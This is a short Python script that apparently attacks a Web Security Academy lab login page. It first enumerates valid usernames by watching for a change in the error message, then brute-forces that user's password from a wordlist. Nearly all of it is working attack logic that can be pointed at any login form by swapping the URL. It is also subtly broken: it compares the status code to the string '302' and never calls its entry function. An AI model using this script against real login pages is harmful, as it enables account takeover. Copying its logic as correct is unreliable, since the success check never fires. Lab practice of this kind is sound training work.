import requests

url = "https://0a6d00800346df68812693900080003f.web-security-academy.net/login"
userList = "usernames"
passList = "password"
grep = "Invalid username or password."

def CahngeinUsername():
    with open(userList , 'r') as usernames:
        for username in usernames:
            username = username.strip('\n')
            data = {'username': username, 'password': 'password'}
            response = requests.post(url, data=data, allow_redirects=False )
            if grep in response.text:
                print(f"No Change with 'username' = {username} and 'password' = password")
                continue
            else:
                print(f"Change with 'username' = {username} and 'password' = password")
                return username
            
def ChangeinPass():
    FoundUsername = CahngeinUsername()
    with open(passList , 'r') as passwords:
        for password in passwords:
            password = password.strip('\n')
            data = {'username': FoundUsername, 'password': password}
            response = requests.post(url, data=data, allow_redirects=False )
            if response.status_code == '302':
                print(f"{response.status_code} Login successful with 'username' = {FoundUsername} and 'password' = {password}.")
                break
            else:
                print(f"{response.status_code} Wrong Login with 'username' = {FoundUsername} and 'password' = {password}")
                continue